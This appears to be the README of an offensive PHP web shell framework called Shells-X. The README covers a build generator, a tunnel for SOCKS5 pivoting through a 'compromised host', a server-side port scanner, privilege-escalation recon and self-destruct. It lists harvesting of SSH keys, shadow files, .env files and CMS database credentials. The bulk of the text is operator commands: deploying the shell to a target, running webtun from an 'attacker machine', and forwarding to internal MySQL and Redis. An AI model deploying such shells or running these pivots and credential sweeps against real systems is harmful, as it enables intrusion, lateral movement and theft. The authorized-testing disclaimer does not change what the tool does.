# Shells-X

[![License: MIT](https://img.shields.io/badge/License-MIT-green.svg)](LICENSE)
[![Python 3.6+](https://img.shields.io/badge/Python-3.6%2B-blue.svg)](https://www.python.org/)
[![PHP 5.6+](https://img.shields.io/badge/PHP-5.6%2B-777BB4.svg)](https://www.php.net/)
[![Zero Dependencies](https://img.shields.io/badge/Dependencies-Zero-brightgreen.svg)](https://github.com/vektor-x-com/Shells-X)
[![Single File Deploy](https://img.shields.io/badge/Deploy-Single%20File-orange.svg)](https://github.com/vektor-x-com/Shells-X)
[![Platform](https://img.shields.io/badge/Platform-Linux-lightgrey.svg)](https://github.com/vektor-x-com/Shells-X)

A modular, single-file web shell framework with a build generator. Source modules are developed separately — deployment is always one file. Every build gets a unique SHA256 fingerprint.

> **Disclaimer:** This tool is intended for authorized penetration testing, red team operations, CTF competitions, and security research only. Unauthorized access to computer systems is illegal. Always obtain proper authorization before use.

## Features

- **PHP Console** — execute PHP code with error handling, configurable timeout, and fatal error recovery
- **OS Shell** — auto-detected command execution (probes `system`, `exec`, `shell_exec`, `passthru`, `popen`, `proc_open`) with persistent CWD and command history
- **Multiplexed Tunnel (WebTun)** — built-in HTTP tunnel with SOCKS5 proxy and port forwarding. Multiplexes hundreds of channels over a single HTTP connection. Works on hardened cPanel environments (see [Tunnel & Pivoting](#tunnel--pivoting))
- **Port Scanner** — parallel TCP/UDP scanner with async connect, banner grabbing, TLS cert inspection, and service fingerprinting. Runs server-side — no tunnel overhead
- **File Browser** — navigate, download, upload, delete. Shows permissions, owner:group, symlink targets, R/W flags
- **System Diagnostics** — 30+ recon checks for privilege escalation, network pivoting, and credential harvesting (see [Diagnostics](#diagnostics))
- **Command History** — persistent history with re-run, export, and IndexedDB storage
- **Auto-Randomized Themes** — every build gets a unique color palette by default, with 6 named presets and custom accent support
- **Traffic Encryption** — AES-256-CBC encrypts all request/response payloads when password protection is enabled, key derived from login password
- **Framework Detection** — auto-detects 15+ CMS/frameworks (WordPress, Laravel, Joomla, Drupal, Symfony, Magento, etc.) with version, DB credentials, debug mode, and admin paths
- **Self-Destruct** — one-click button to permanently delete the shell file from the server, clear sessions, and wipe local data

## Quick Start

```bash
# Default build
python generate.py

# Password-protected with tunnel
python3 webtun/webtun.py --generate -k tunnelpass
python generate.py --tunnel webtun/webtun_servers/tunnel.php --password s3cret --minify

# Minimal build
python generate.py --exclude tunnel,diagnostics

# Named color theme
python generate.py --theme ocean

# Custom accent color
python generate.py --accent "#ff6600"

# Verify integrity
python generate.py --verify dist/shell_a3f8c1e2.php
```

Output lands in `dist/`. Deploy the single `.php` file to a web server.

## Generator Options

| Flag | Description |
|------|-------------|
| `--password SECRET` | SHA256 password protection (plaintext never stored) |
| `--tunnel FILE` | Embed tunnel PHP (WebTun or Neo-reGeorg) |
| `--seed STRING` | Operator seed for unique fingerprinting |
| `--minify` | Strip comments, collapse whitespace |
| `--exclude MODULES` | Comma-separated: `tunnel`, `diagnostics`, `history` |
| `--theme NAME` | Color theme: `ocean`, `crimson`, `forest`, `purple`, `mono`, `solar` |
| `--accent COLOR` | Custom accent hex color (e.g. `"#ff6600"`) |
| `--output NAME` | Custom output filename |
| `--verify FILE` | Check integrity of a generated shell |

## Tunnel & Pivoting

Shells-X includes **WebTun** — a multiplexed HTTP tunnel that creates a SOCKS5 proxy through the compromised host. Unlike traditional SOCKS5-over-HTTP tunnels (Neo-reGeorg, reGeorg), WebTun multiplexes all channels over a single HTTP connection with binary framing, encrypted transport, and real-time streaming. This eliminates the per-connection overhead that causes false positives/negatives in port scanning and fuzzing.

### Why WebTun over Neo-reGeorg?

| | Neo-reGeorg | WebTun |
|--|-------------|--------|
| Connections | 1 HTTP request per TCP connection | All channels multiplexed over 1 connection |
| Downstream | Client polls for data | Real-time streaming (flush) |
| Upstream | 1 POST per write | Batched POSTs (multiple frames per request) |
| PHP-FPM workers | 1 per active connection | 1 total for all channels |
| Scanning accuracy | False positives/negatives from timeouts | Accurate open/closed/filtered states |
| Fuzzing | ~5-50 req/s, unreliable results | ~200-500 req/s, clean results |
| Hardened hosts | Requires exec for some features | Only needs `stream_socket_client` + `stream_select` |
| Encryption | Basic XOR | AES-256-CBC + HMAC-SHA256 |

### Setup

```bash
# 1. Generate tunnel server with password (creates webtun_servers/tunnel.php)
python3 webtun/webtun.py --generate -k mypassword

# 2. Build shell with tunnel embedded
python generate.py --tunnel webtun/webtun_servers/tunnel.php --password shellpass

# 3. Deploy shell.php to target, then connect from attacker machine
python3 webtun/webtun.py -u https://target.com/shell.php -k mypassword --socks 1080
```

Requires `aiohttp` and `cryptography` on the attacker machine:
```bash
cd webtun && python3 -m venv .venv && source .venv/bin/activate && pip install -r requirements.txt
```

### Port forwarding vs SOCKS5 — when to use which

Port forwarding (`-L`) creates a direct TCP pipe — your tool connects to a local port, bytes flow straight through the tunnel to the target. No SOCKS handshake, no proxychains, no LD_PRELOAD hooking. The tool doesn't even know it's going through a tunnel. This is **always faster and more reliable** than SOCKS5 for targeted access.

SOCKS5 adds a per-connection negotiation layer (greeting → method → CONNECT → reply → data) and requires the tool to support SOCKS or be wrapped with proxychains. Use it only when you need dynamic destination routing (subnet scanning, browsing multiple hosts).

| Use case | Best approach | Why |
|----------|--------------|-----|
| Hit one specific service (MySQL, Redis, web app) | `-L` port forward | Zero overhead, tool works natively |
| Fuzz one web app | `-L 8080:target:80` + ffuf on localhost | ffuf gets a clean TCP pipe, full speed |
| Scan a known host's ports | `-L` or built-in scanner | No SOCKS negotiation per probe |
| Scan an entire subnet | SOCKS5 (`--socks`) | Can't pre-define `-L` for 254 hosts |
| Browse multiple internal sites | SOCKS5 + browser | Dynamic destinations |
| Tool doesn't support SOCKS | `-L` port forward | Works with literally everything |

**In practice**: use `-L` for everything targeted, SOCKS5 only for discovery/dynamic work. You can combine both in one session:

```bash
python3 webtun/webtun.py -u https://target.com/shell.php -k mypassword \
  --socks 1080 \
  -L 8080:internal-web:80 \
  -L 13306:db-server:3306 \
  -L 16379:cache:6379
```

SOCKS5 for nmap subnet discovery, port forwards for everything you interact with.

### Port forwarding examples

```bash
# Forward specific services
python3 webtun/webtun.py -u https://target.com/shell.php -k mypassword \
  -L 13306:10.0.0.5:3306 \
  -L 16379:10.0.0.5:6379 \
  -L 8080:internal-web:80

# Connect directly — no proxy config needed, works with any tool
mysql -h 127.0.0.1 -P 13306 -u root -p
redis-cli -p 16379
curl http://127.0.0.1:8080/
sqlmap -u "http://127.0.0.1:8080/page?id=1" --batch
ffuf -u http://127.0.0.1:8080/FUZZ -w wordlist.txt
ssh -p 2222 user@127.0.0.1   # with -L 2222:10.0.0.1:22
```

### SOCKS5 proxy examples

```bash
# Start with SOCKS5 enabled (default port 1080)
python3 webtun/webtun.py -u https://target.com/shell.php -k mypassword --socks 1080

# Curl — use socks5h:// to resolve DNS through the tunnel
curl --proxy socks5h://127.0.0.1:1080 http://internal-app/
curl --proxy socks5h://127.0.0.1:1080 http://10.0.0.5:8080/api/health

# Fuzzing through SOCKS5
ffuf -u http://10.0.0.5/FUZZ -w wordlist.txt -x socks5://127.0.0.1:1080
gobuster dir -u http://10.0.0.5 -w wordlist.txt --proxy socks5://127.0.0.1:1080

# Browser
chromium --proxy-server="socks5://127.0.0.1:1080"

# SSH through tunnel
ssh -o ProxyCommand='ncat --proxy-type socks5 --proxy 127.0.0.1:1080 %h %p' user@10.0.0.5
```

### Nmap through the tunnel

Nmap uses `--proxies` (plural) with `socks4://` — it does NOT support `socks5://` or the `--proxy` flag.

```bash
# Subnet scan
nmap -sT -Pn -n --proxies socks4://127.0.0.1:1080 10.0.0.0/24 -p 80,443,3306,6379,8080

# Service detection on specific host
nmap -sT -Pn -n --proxies socks4://127.0.0.1:1080 10.0.0.5 -p 1-1000 -sV

# Full port scan
nmap -sT -Pn -n --proxies socks4://127.0.0.1:1080 10.0.0.5 -p 1-65535
```

| Flag | Why |
|------|-----|
| `-sT` | TCP connect scan — only type that works through SOCKS |
| `-Pn` | Skip host discovery — ICMP can't traverse SOCKS |
| `-n` | No DNS resolution — nmap resolves locally, internal hostnames won't work. For hostname resolution through the tunnel, use curl with `socks5h://` instead |
| `--proxies socks4://` | Nmap's required format. NOT `--proxy`, NOT `socks5://` |

### WebTun client options

| Flag | Description |
|------|-------------|
| `-u URL` | Shell URL |
| `-k KEY` | Tunnel password |
| `--socks PORT` | SOCKS5 listen port (default: 1080, 0 to disable) |
| `-L local:host:port` | Port forward (repeatable) |
| `--upstream-pool N` | Upstream HTTP connections (default: 3) |
| `--batch-ms MS` | Upstream batching window in ms (default: 5) |
| `--no-verify-ssl` | Skip TLS certificate verification |
| `-v` | Debug logging |

### Built-in port scanner (no tunnel needed)

The Scanner tab runs a parallel port scanner **server-side in PHP** — no tunnel overhead, no SOCKS5. Direct `stream_socket_client()` from the web server to targets. Supports:

- TCP and UDP scanning with configurable concurrency (up to 512 parallel connections)
- Banner grabbing + service fingerprinting (SSH, HTTP, MySQL, Redis, PostgreSQL, etc.)
- TLS certificate inspection
- CIDR notation, IP ranges, port ranges
- Pause/resume/stop controls
- Results stored in IndexedDB with export

For network discovery, use the built-in scanner (faster, more accurate). For interactive tool access, use the tunnel with `-L` port forwards. For dynamic routing to unknown hosts, use the SOCKS5 proxy.

### Legacy: Neo-reGeorg

Neo-reGeorg is still supported via the same `--tunnel` flag:

```bash
python3 neoreg.py -g -k mypassword
python generate.py --tunnel neoreg_servers/tunnel.php --password shellpass
python3 neoreg.py -u https://target.com/shell.php -k mypassword --skip
```

## Diagnostics

The Diagnostics tab runs 30+ pure-PHP recon checks (no shell execution required). Everything is read from `/proc`, `stat()`, `fileperms()`, and filesystem reads — works even when all exec functions are disabled.

### System & Identity

| Check | What it shows |
|-------|--------------|
| PHP config | Version, disable_functions, open_basedir, allow_url_fopen |
| Process identity | UID, GID, groups, supplementary group memberships |
| Container detection | Docker, Podman, Kubernetes, LXC (via cgroups, /.dockerenv, PID 1) |
| Login users | /etc/passwd users with real shells, UID highlighted |
| Privileged groups | Members of sudo, wheel, docker, lxd, adm, shadow, disk |

### Network

| Check | What it shows |
|-------|--------------|
| Open ports | Listening TCP ports (IPv4+IPv6) with UID and process correlation |
| ARP table | Neighboring hosts with MAC addresses |
| Routing table | Routes with gateway, mask, metric |

### Privilege Escalation

| Check | What it finds | Why it matters |
|-------|--------------|----------------|
| **SUID/SGID binaries** | Setuid/setgid binaries with GTFOBins matching | Direct root escalation if exploitable binary found |
| **Capabilities** | Decoded CapEff/CapBnd with dangerous cap highlighting | CAP_SETUID, CAP_SYS_ADMIN = instant privesc |
| **Cron jobs** | /etc/crontab, cron.d, user crontabs + writable script detection | Writable cron script = code exec as that user |
| **Sudo config** | /etc/sudoers + sudoers.d contents | NOPASSWD entries, runas rules |
| **Docker socket** | /var/run/docker.sock access + docker group check | Writable socket = root equivalent |
| **Mount points** | Filesystem flags: rw, nosuid, noexec | rw + no nosuid = can place/run SUID binaries |
| **Kernel info** | Version, architecture, ASLR status | Kernel version for exploit matching, ASLR off = easier exploitation |
| **Security modules** | SELinux (enforcing/permissive), AppArmor, Seccomp | Permissive/disabled = fewer restrictions on exploits |
| **LD_PRELOAD** | /etc/ld.so.preload writability | Writable = inject shared library into any process |
| **NFS exports** | /etc/exports with no_root_squash detection | no_root_squash = create SUID binaries via NFS |
| **Systemd timers** | Timer + service files, writable ExecStart targets | Writable target script = code exec as service user |

### Credentials & Files

| Check | What it finds |
|-------|--------------|
| Sensitive files | SSH keys (rsa/ed25519/ecdsa), authorized_keys, host keys, shadow, sudoers, bash/zsh history |
| Environment files | .env, .env.local, .env.production across web roots |
| Credential files | .my.cnf, debian.cnf, .pgpass, wp-config.php, database.php/yml |
| Backup files | .bak, .old, .sql, .sql.gz, .swp, .cfg in web roots |
| Writable dirs | /tmp, /dev/shm, /var/tmp, web roots |
| Binary dirs | Readability and writability of /bin, /usr/bin, etc. |

### PHP Execution Analysis

| Check | What it shows |
|-------|--------------|
| Dangerous functions | 18 exec functions + FFI class availability |
| Extensions | FFI, sockets, pcntl, phar, openssl, etc. |
| Indirect vectors | When all direct exec is disabled, shows: mail() -X file write, error_log() type 3 file write, fsockopen() reverse shells, FFI libc calls |
| Interpreters & tools | Available python, perl, ruby, gcc, nmap, curl, wget, socat, etc. |
| Hosting panels | Detects 19+ panels (cPanel, Plesk, aaPanel, CloudPanel, etc.) |

## Theming

Every build automatically gets a unique, randomized color palette — no two shells look the same by default. Colors are derived from a random hue using HSL color space, keeping semantic colors (green/red/yellow for success/error/warning) fixed for usability.

```bash
# Auto-random (default) — unique palette each build
python generate.py

# Deterministic — same seed always produces the same palette
python generate.py --seed "op-nighthawk"

# Named preset
python generate.py --theme crimson

# Preset with accent override
python generate.py --theme mono --accent "#00ff88"
```

Available presets: `ocean`, `crimson`, `forest`, `purple`, `mono`, `solar`

When `--password` is set, the login page also matches the chosen theme.

## Traffic Encryption

When `--password` is set, all request/response payloads are automatically encrypted with AES-256-CBC. The encryption key is derived from the login password (`SHA256(password)`).

- The login form captures the password hash into `sessionStorage` before authenticating
- All subsequent `fetchJSON` calls encrypt the FormData and decrypt the response
- File downloads (GET requests) and file uploads bypass encryption
- If `sessionStorage` is cleared (new tab), the shell prompts for the passphrase
- Requires Web Crypto API (HTTPS or localhost) and PHP OpenSSL extension

No extra flags needed — encryption activates automatically with `--password`.

## Self-Destruct

A button in the sidebar permanently destroys the shell:

1. Sends `action=destruct` → PHP calls `unlink(__FILE__)` + `session_destroy()`
2. JS clears IndexedDB (`shelldb`) and `sessionStorage`
3. Page is replaced with a "Shell destroyed" message

Double confirmation prompt prevents accidental use. Always present regardless of modules or auth.

## Framework Detection

The Diagnostics tab auto-detects CMS and frameworks on the target filesystem using signature files (pure PHP, no shell exec). For each detected framework, it extracts:

- Version number
- Config file path
- Database credentials (host, name, user, password)
- Debug mode status
- Admin panel path
- Plugin/theme counts (WordPress)

Supported: WordPress, Laravel, Joomla, Drupal, Symfony, CodeIgniter, Magento 1/2, PrestaShop, Nextcloud/OwnCloud, phpBB, MediaWiki, Moodle, CakePHP, Yii2

## Build Fingerprint

Every shell embeds a unique `__BUILD` with hash, timestamp, language, version, and operator seed. Visible in Diagnostics > Build Info. Use `--verify` to check integrity.

## Password Protection

```bash
python generate.py --password "hunter2"
```

SHA256 hash embedded — plaintext never stored. Logout via `?logout`.

## Development

A Docker-based dev setup is included for rapid iteration:

```bash
# Start dev containers (PHP 8.2 + Apache, nginx/mysql/redis targets)
docker compose -f dev/docker-compose.yml up -d

# Build shell (output is volume-mounted — changes are instant)
python generate.py --output dev.php --theme ocean

# Open http://localhost:8888/dev.php

# Auto-rebuild on source changes
cd dev && ./watch.sh --theme ocean
```

Internal target services for testing scanner and tunnel:

| Service | Hostname (from shell) | Port |
|---------|----------------------|------|
| nginx | `target-web` | 80 |
| MySQL 8.0 | `target-mysql` | 3306 |
| Redis | `target-redis` | 6379 |

## Project Structure

```
Shells-X/
├── generate.py                  # Build tool (Python 3, zero deps)
├── templates/php.tpl            # Single-file PHP template
├── src/
│   ├── config/defaults.json     # Module definitions
│   ├── backend/php/
│   │   ├── _order.json          # Assembly order
│   │   ├── crypto.php           # AES-256-CBC request/response encryption
│   │   ├── scanner.php          # Parallel TCP/UDP port scanner
│   │   ├── filebrowser.php      # Directory listing
│   │   ├── fileops.php          # Delete + upload
│   │   ├── eval.php             # PHP code execution
│   │   ├── shell.php            # OS command execution
│   │   ├── diagnostics.php      # System recon + privesc checks
│   │   └── destruct.php         # Self-destruct handler
│   └── frontend/
│       ├── css/shell.css        # Dark theme
│       ├── html/layout.html     # Layout with module markers
│       └── js/                  # core, crypto, db, console, shell, tunnel,
│                                # scanner, diagnostics, history, filebrowser
├── webtun/                      # Multiplexed HTTP tunnel
│   ├── webtun.py                # Python client + server generator
│   ├── templates/tunnel.php     # PHP server template
│   ├── requirements.txt         # aiohttp, cryptography
│   └── webtun_servers/          # Generated output (gitignored)
├── dev/                         # Development environment
│   ├── docker-compose.yml       # PHP + target services
│   └── watch.sh                 # Auto-rebuild file watcher
└── dist/                        # Generated shells (gitignored)
```

## Keyboard Shortcuts

| Key | Context | Action |
|-----|---------|--------|
| `Ctrl+Enter` | PHP Console | Execute code |
| `Enter` | OS Shell | Execute command |
| `Arrow Up/Down` | OS Shell | Navigate history |
| `Ctrl+L` | OS Shell | Clear output |

## Requirements

- **Generator:** Python 3.6+ (stdlib only)
- **Runtime:** PHP 5.6+ (`stream_socket_client` needed for tunnel and scanner)
- **Tunnel client:** Python 3.8+ with `aiohttp`, `cryptography`
- **Browser:** Any modern browser with IndexedDB

## License

MIT
